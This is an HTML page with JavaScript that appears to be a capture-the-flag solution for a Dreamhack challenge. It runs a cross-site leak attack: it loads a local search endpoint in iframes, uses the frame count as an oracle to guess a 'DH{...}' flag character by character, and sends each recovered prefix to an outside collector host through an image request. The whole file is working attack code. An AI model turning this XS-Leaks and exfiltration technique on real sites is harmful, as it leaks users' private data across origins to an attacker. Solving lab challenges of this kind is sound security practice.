<iframe id="iframe"></iframe>
<img id="img">
<script>
    async function search(query){
        return new Promise((resolve, reject)=>{
            let iframe = document.createElement("iframe");
            iframe.src = "http://127.0.0.1:8000/search?query=" + query;
            document.body.appendChild(iframe);

            iframe.onload = () => {
                try{
                    result = iframe.contentWindow.frames.length;
                    document.body.removeChild(iframe);
                    resolve(result > 0);
                }
                catch(e){
                    document.body.removeChild(iframe);
                    document.body.removeChild(iframe);
                    resolve(false);
                }
            };

            setTimeout(() => {
                document.body.removeChild(iframe);
                resolve(false);
            }, 1000); // 1초 타임아웃 설정
        });
    }

    async function exploit(){
        let chars = "0123456789abcdef";
        let secret = "DH{";

        while(!secret.includes("}")){
            let promise = chars.split("").map(c => search(secret + c).then(result => ({char: c, success: result})));
            let results = await Promise.all(promise);

            let found = false;

            for (let rslt of results){
                if(rslt.success){
                    secret += rslt.char;
                    found = true;
                    img.src = `https://sypkhxt.request.dreamhack.games/${secret}`;
                    break;
                }
            }

            if(!found){
                throw new Error("Not found");
            }
        }
        
        search("DH{");
    }

    exploit()
</script>
